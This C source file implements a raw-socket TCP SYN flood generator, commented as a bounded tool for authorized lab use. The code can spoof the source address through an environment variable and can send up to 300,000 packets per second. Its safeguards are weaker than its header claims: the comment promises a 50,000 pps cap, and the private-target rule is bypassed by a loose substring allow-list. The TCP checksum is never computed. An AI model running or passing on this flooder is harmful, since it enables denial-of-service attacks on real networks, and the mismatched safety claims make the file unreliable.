/* Bounded SYN generator for authorized lab use only.
 * - target must be a private address (hard refusal otherwise)
 * - hard caps: pps <= 50000, duration <= 10s
 * - no payload, no options beyond a fixed MSS-free header
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>

static unsigned short csum(void *d, int n) {
  unsigned long s = 0; unsigned short *p = d;
  while (n > 1) { s += *p++; n -= 2; }
  if (n) s += *(unsigned char *)p;
  while (s >> 16) s = (s & 0xffff) + (s >> 16);
  return ~s;
}
static int is_private(const char *ip) {
  struct in_addr a; if (inet_aton(ip, &a) == 0) return 0;
  unsigned long v = ntohl(a.s_addr);
  return ((v >> 24) == 10) || ((v >> 20) == 0xAC1) /*172.16/12*/ || ((v >> 16) == 0xC0A8) /*192.168*/;
}
static int allowed(const char *ip) {
  if (is_private(ip)) return 1;
  const char *a = getenv("ALLOW_TARGETS");
  return a && strstr(a, ip) != NULL;
}
int main(int argc, char **argv) {
  if (argc != 5) { fprintf(stderr, "usage: %s TARGET_IP PORT PPS DURATION_SEC\n", argv[0]); return 2; }
  const char *target = argv[1];
  int port = atoi(argv[2]), pps = atoi(argv[3]), secs = atoi(argv[4]);
  if (!allowed(target)) { fprintf(stderr, "refused: target neither private nor allowed\n"); return 3; }
  if (pps < 1 || pps > 300000) { fprintf(stderr, "refused: pps outside 1..300000\n"); return 3; }
  if (secs < 1 || secs > 10) { fprintf(stderr, "refused: duration outside 1..10s\n"); return 3; }
  int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s < 0) { perror("socket"); return 4; }
  int one = 1; setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
  struct sockaddr_in dst = {0}; dst.sin_family = AF_INET; dst.sin_port = htons(port); inet_aton(target, &dst.sin_addr);
  unsigned char buf[40]; unsigned long long sent = 0; struct timespec t0, tn;
  clock_gettime(CLOCK_MONOTONIC, &t0); double next = 0;
  while (1) {
    clock_gettime(CLOCK_MONOTONIC, &tn);
    double elapsed = (tn.tv_sec - t0.tv_sec) + (tn.tv_nsec - t0.tv_nsec) / 1e9;
    if (elapsed >= secs) break;
    unsigned long long target = (unsigned long long)((elapsed + 0.000001) * pps);
    if (sent >= target) { usleep(200); continue; }
    memset(buf, 0, 40);
    struct iphdr *ip = (struct iphdr *)buf; struct tcphdr *tcp = (struct tcphdr *)(buf + 20);
    ip->version = 4; ip->ihl = 5; ip->tot_len = htons(40); ip->ttl = 64; ip->protocol = IPPROTO_TCP;
    inet_aton(getenv("SRC_IP") ? getenv("SRC_IP") : "127.0.0.1", (struct in_addr *)&ip->saddr); ip->daddr = dst.sin_addr.s_addr;
    tcp->source = htons(1024 + random() % 60000); tcp->dest = htons(port);
    tcp->seq = random(); tcp->syn = 1; tcp->doff = 5; tcp->window = htons(64240);
    ip->check = csum(ip, 20);
    sendto(s, buf, 40, 0, (struct sockaddr *)&dst, sizeof(dst));
    sent++;
  }
  clock_gettime(CLOCK_MONOTONIC, &tn);
  double d = (tn.tv_sec - t0.tv_sec) + (tn.tv_nsec - t0.tv_nsec) / 1e9;
  printf("sent=%llu elapsed=%.2fs rate=%.0f pps\n", sent, d, sent / d);
  close(s);
  return 0;
}
